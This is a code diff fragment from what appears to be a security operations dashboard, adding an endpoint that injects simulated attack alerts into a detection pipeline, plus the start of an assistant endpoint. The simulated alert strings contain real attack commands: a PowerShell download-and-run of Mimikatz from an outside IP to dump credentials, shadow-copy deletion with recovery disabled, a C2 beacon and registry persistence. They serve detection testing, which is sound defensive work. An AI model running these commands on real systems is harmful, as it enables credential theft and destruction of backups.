@@ -1,0 +1,85 @@
+1644:     })
+1645: 
+1646: # ── 1-CLICK LIVE ATTACK SIMULATION ENGINE ─────────────────────────
+1647: @app.route("/api/simulate_attack", methods=["POST"])
+1648: @require_auth
+1649: def api_simulate_attack():
+1650:     """Triggers an end-to-end simulated cyber attack through the live detection
+1651:     pipeline, generating telemetry, scoring risk, and executing SOAR containment."""
+1652:     data = request.json or {}
+1653:     scenario = (data.get("scenario") or "mimikatz").lower()
+1654:     host = data.get("host") or "SOC-ENDPOINT-01"
+1655:     user = data.get("user") or "analyst_demo"
+1656: 
+1657:     scenarios = {
+1658:         "mimikatz": {
+1659:             "event": "Mimikatz Credential Dumping Detected",
+1660:             "detail": f"Process: powershell.exe (PID: {random.randint(2000, 9000)})\nCommand: powershell.exe -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.5:80/invoke-mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\nTarget: LSASS.exe memory injection",
+1661:             "host": host,
+1662:             "user": user,
+1663:             "source": "powershell",
+1664:             "log_source": "PowerShell",
+1665:             "ip": "185.220.101.5",
+1666:             "mitre_id": "T1003.001",
+1667:             "mitre_tactic": "Credential Access"
+1668:         },
+1669:         "ransomware": {
+1670:             "event": "Ransomware Precursor & Shadow Copy Deletion",
+1671:             "detail": f"Process: cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set default recoveryenabled No\nCanary File Trigger: canary_files/passwords.txt modified",
+1672:             "host": host,
+1673:             "user": user,
+1674:             "source": "cmd",
+1675:             "log_source": "CMD",
+1676:             "ip": "95.173.136.1",
+1677:             "mitre_id": "T1490",
+1678:             "mitre_tactic": "Impact"
+1679:         },
+1680:         "c2_beacon": {
+1681:             "event": "Suspicious External C2 Beacon Connection",
+1682:             "detail": f"Process: rundll32.exe (PID: {random.randint(1000, 8000)})\nOutbound Connection: {host} -> 185.220.101.5:4444 [ESTABLISHED]\nThreat Intel: Known Cobalt Strike C2 IP",
+1683:             "host": host,
+1684:             "user": user,
+1685:             "source": "network",
+1686:             "log_source": "Network",
+1687:             "ip": "185.220.101.5",
+1688:             "mitre_id": "T1071.001",
+1689:             "mitre_tactic": "Command and Control"
+1690:         },
+1691:         "persistence": {
+1692:             "event": "Registry RunKey Persistence Implant",
+1693:             "detail": f"Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateService\nValue: C:\\Users\\Public\\updater.exe --silent-beacon",
+1694:             "host": host,
+1695:             "user": user,
+1696:             "source": "registry",
+1697:             "log_source": "Registry",
+1698:             "ip": "8.8.8.8",
+1699:             "mitre_id": "T1547.001",
+1700:             "mitre_tactic": "Persistence"
+1701:         }
+1702:     }
+1703: 
+1704:     raw = scenarios.get(scenario, scenarios["mimikatz"])
+1705:     # Pass through live alert pipeline
+1706:     created_alert = process_alert(raw)
+1707: 
+1708:     return jsonify({
+1709:         "success": True,
+1710:         "scenario": scenario,
+1711:         "alert": created_alert,
+1712:         "message": f"Successfully simulated '{scenario.upper()}' attack scenario through live pipeline."
+1713:     })
+1714: 
+1715: # ── SOC AI COPILOT & NATURAL LANGUAGE THREAT ASSISTANT ────────────
+1716: @app.route("/api/ai_copilot", methods=["POST"])
+1717: @require_auth
+1718: def api_ai_copilot():
+1719:     """Natural language AI Copilot for SOC Analysts: summarizes alerts,
+1720:     queries IOC reputation, explains MITRE techniques, and generates briefings."""
+1721:     try:
+1722:         data = request.json or {}
+1723:         query = (data.get("query") or "").strip().lower()
+1724:         if not query:
+1725:             return jsonify({
+1726:                 "success": True,
+1727:                 "reply": "Hello! I am your SentinelX SOC AI Copilot. You can ask me to summarize active incidents, check IP reputations, explain detection rules, or analyze MITRE techniques.",
+1728:                 "suggested_queries": ["Summarize active incidents", "Show critical alerts", "How does host isolation work?", "Check IOC 185.220.101.5"]
